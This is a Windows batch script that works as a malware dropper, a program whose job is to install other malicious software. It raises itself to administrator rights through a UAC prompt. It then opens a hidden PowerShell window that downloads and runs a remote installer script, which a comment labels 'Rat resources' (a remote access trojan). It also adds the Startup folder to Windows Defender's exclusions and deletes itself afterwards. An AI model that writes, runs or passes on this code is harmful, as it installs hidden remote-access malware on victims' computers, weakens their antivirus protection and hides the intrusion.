@echo off
:: BatchGotAdmin
:checkPrivileges
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    ECHO Not running with admin privileges, attempting to elevate...
    GOTO UACPrompt
) ELSE (
    ECHO Already running with admin privileges.
    GOTO gotAdmin
)

:UACPrompt
    ECHO Requesting administrative privileges...
    ECHO Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    ECHO UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
    CScript "%temp%\getadmin.vbs"
    DEL "%temp%\getadmin.vbs"
    EXIT /B

:gotAdmin
    ECHO Administrative permissions granted.
    PUSHD "%CD%"
    CD /D "%~dp0"

REM Debugging Pause
PAUSE


REM Rat resources
powershell powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aksruganda/OnlyRay/main/installer.ps1?token=GHSAT0AAAAAACUVQES2AJAWNKQ3LXW6ZIZQZUOIWMQ'  -OutFile 'installer.ps1'"; Add-MpPreference -ExclusionPath "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"; ./installer.ps1


REM Initiate Self Delete
del wget.cmd
